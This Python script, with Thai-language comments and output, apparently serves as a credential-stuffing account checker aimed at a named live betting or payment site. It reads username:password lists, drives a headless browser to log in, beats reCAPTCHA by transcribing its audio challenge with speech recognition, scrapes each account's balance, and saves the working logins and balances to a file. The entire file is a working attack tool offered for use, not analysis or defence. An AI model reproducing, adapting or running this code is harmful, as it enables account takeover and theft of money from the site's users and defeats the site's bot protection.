import os
import urllib.request
import random
import time
from typing import Optional
import pydub
import speech_recognition as sr
from colorama import Fore, Style, init
from DrissionPage import ChromiumPage, ChromiumOptions

# Initialize colorama
init(autoreset=True)

# Configuration
INPUT_FILE = 'msd.txt'
OUTPUT_FILE = 'valid_accounts.txt'

# --- RecaptchaSolver Class (From attached file) ---
class RecaptchaSolver:
    """A class to solve reCAPTCHA challenges using audio recognition."""

    # Constants
    TEMP_DIR = os.getenv("TEMP") if os.name == "nt" else "/tmp"
    TIMEOUT_STANDARD = 7
    TIMEOUT_SHORT = 1
    TIMEOUT_DETECTION = 0.05

    def __init__(self, driver: ChromiumPage) -> None:
        """Initialize the solver with a ChromiumPage driver.

        Args:
            driver: ChromiumPage instance for browser interaction
        """
        self.driver = driver

    def solveCaptcha(self) -> None:
        """Attempt to solve the reCAPTCHA challenge.

        Raises:
            Exception: If captcha solving fails or bot is detected
        """
        
        # Handle main reCAPTCHA iframe
        # Check if reCAPTCHA exists first to avoid timeout if not present
        if not self.driver.ele("@title=reCAPTCHA"):
             # Try finding by iframe src if title not found immediately
             if not self.driver.ele("xpath://iframe[contains(@src, 'recaptcha')]"):
                 return

        try:
            self.driver.wait.ele_displayed(
                "@title=reCAPTCHA", timeout=self.TIMEOUT_STANDARD
            )
            time.sleep(0.1)
            iframe_inner = self.driver("@title=reCAPTCHA")

            # Click the checkbox
            iframe_inner.wait.ele_displayed(
                ".rc-anchor-content", timeout=self.TIMEOUT_STANDARD
            )
            iframe_inner(".rc-anchor-content", timeout=self.TIMEOUT_SHORT).click()
        except:
            pass

        # Check if solved by just clicking
        if self.is_solved():
            return

        # Handle audio challenge
        # Try to find the challenge iframe
        iframe = self.driver("xpath://iframe[contains(@title, 'recaptcha challenge')]")
        if not iframe:
             iframe = self.driver("xpath://iframe[contains(@src, 'bframe')]")
        
        if not iframe:
            return

        try:
            iframe.wait.ele_displayed(
                "#recaptcha-audio-button", timeout=self.TIMEOUT_STANDARD
            )
            iframe("#recaptcha-audio-button", timeout=self.TIMEOUT_SHORT).click()
            time.sleep(0.3)

            if self.is_detected():
                raise Exception("Captcha detected bot behavior")

            # Download and process audio
            iframe.wait.ele_displayed("#audio-source", timeout=self.TIMEOUT_STANDARD)
            src = iframe("#audio-source").attrs["src"]

            text_response = self._process_audio_challenge(src)
            iframe("#audio-response").input(text_response.lower())
            iframe("#recaptcha-verify-button").click()
            time.sleep(0.4)

            if not self.is_solved():
                raise Exception("Failed to solve the captcha")

        except Exception as e:
            # print(f"Audio challenge error: {e}")
            pass

    def _process_audio_challenge(self, audio_url: str) -> str:
        """Process the audio challenge and return the recognized text.

        Args:
            audio_url: URL of the audio file to process

        Returns:
            str: Recognized text from the audio file
        """
        mp3_path = os.path.join(self.TEMP_DIR, f"{random.randrange(1,1000)}.mp3")
        wav_path = os.path.join(self.TEMP_DIR, f"{random.randrange(1,1000)}.wav")

        try:
            urllib.request.urlretrieve(audio_url, mp3_path)
            sound = pydub.AudioSegment.from_mp3(mp3_path)
            sound.export(wav_path, format="wav")

            recognizer = sr.Recognizer()
            with sr.AudioFile(wav_path) as source:
                audio = recognizer.record(source)

            return recognizer.recognize_google(audio)

        finally:
            for path in (mp3_path, wav_path):
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except OSError:
                        pass

    def is_solved(self) -> bool:
        """Check if the captcha has been solved successfully."""
        try:
            iframe = self.driver("@title=reCAPTCHA")
            return (
                "style"
                in iframe.ele(
                    ".recaptcha-checkbox-checkmark", timeout=self.TIMEOUT_SHORT
                ).attrs
            )
        except Exception:
            return False

    def is_detected(self) -> bool:
        """Check if the bot has been detected."""
        try:
            return (
                self.driver.ele("Try again later", timeout=self.TIMEOUT_DETECTION)
                .states()
                .is_displayed
            )
        except Exception:
            return False

    def get_token(self) -> Optional[str]:
        """Get the reCAPTCHA token if available."""
        try:
            return self.driver.ele("#recaptcha-token").attrs["value"]
        except Exception:
            return None

# --- Main Logic ---

def save_success(username, password, balance):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        # Format as requested:
        # ชื่อ
        # รหัสผ่าน
        # ยอดเงิน
        # แค่นี้แหละ
        f.write(f"ชื่อ: {username}\n")
        f.write(f"รหัสผ่าน: {password}\n")
        f.write(f"ยอดเงิน: {balance}\n")
        f.write("--------------------------\n")

def check_account(driver, username, password):
    try:
        # Go to login page
        driver.get('https://kmm-th.com/')
        driver.delete_all_cookies() # Ensure fresh session
        
        # Wait for inputs
        if not driver.wait.ele_displayed('#username', timeout=10):
             print(f"{Fore.RED}❌ โหลดหน้าเว็บไม่สำเร็จ | {username}")
             return

        # Fill Login Form
        driver.ele('#username').input(username)
        driver.ele('#password').input(password)
        
        # Solve Captcha
        solver = RecaptchaSolver(driver)
        solver.solveCaptcha()
        
        # Click Login
        # Button selector from file: <button type="submit" ...>
        btn = driver.ele('css:button[type="submit"]')
        if btn:
            btn.click()
        
        # Wait for Balance or Login Success
        # Selector from file: <div class="stats-number" ...>฿1.08</div>
        if driver.wait.ele_displayed('.stats-number', timeout=10):
            balance_ele = driver.ele('.stats-number')
            balance = balance_ele.text
            
            # Print with emojis and colors as requested
            print(f"{Fore.GREEN}✅ เข้าสู่ระบบสำเร็จ")
            print(f"{Fore.CYAN}👤 ชื่อ: {username}")
            print(f"{Fore.CYAN}🔑 รหัสผ่าน: {password}")
            print(f"{Fore.YELLOW}💰 ยอดเงิน: {balance}")
            print(f"{Fore.MAGENTA}--------------------------")
            
            save_success(username, password, balance)
        else:
            print(f"{Fore.RED}❌ เข้าสู่ระบบไม่สำเร็จ (รหัสผิด/Captcha) | {username}")

    except Exception as e:
        print(f"{Fore.RED}⚠️ Error checking {username}: {str(e)}")

def main():
    # Chrome Arguments from file
    CHROME_ARGUMENTS = [
        "-no-first-run",
        "-force-color-profile=srgb",
        "-metrics-recording-only",
        "-password-store=basic",
        "-use-mock-keychain",
        "-export-tagged-pdf",
        "-no-default-browser-check",
        "-disable-background-mode",
        "-enable-features=NetworkService,NetworkServiceInProcess",
        "-disable-features=FlashDeprecationWarning",
        "-deny-permission-prompts",
        "-disable-gpu",
        "-accept-lang=en-US",
        "--disable-usage-stats",
        "--disable-crash-reporter",
        "--no-sandbox",
        "--headless=new" # Added for server env
    ]
    
    options = ChromiumOptions()
    for argument in CHROME_ARGUMENTS:
        options.set_argument(argument)
    
    try:
        driver = ChromiumPage(addr_or_opts=options)
    except Exception as e:
        print(f"{Fore.RED}Critical: Cannot start browser. {e}")
        return

    # Check input file
    if not os.path.exists(INPUT_FILE):
        print(f"{Fore.RED}ไม่พบไฟล์ {INPUT_FILE}")
        return

    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    # Loop through accounts
    for line in lines:
        line = line.strip()
        if not line: continue
        
        # Parse user:pass or user|pass
        u, p = None, None
        if ':' in line:
            parts = line.split(':')
            if len(parts) >= 2: u, p = parts[0], parts[1]
        elif '|' in line:
            parts = line.split('|')
            if len(parts) >= 2: u, p = parts[0], parts[1]
            
        if u and p:
            check_account(driver, u, p)
    
    driver.quit()

if __name__ == "__main__":
    main()
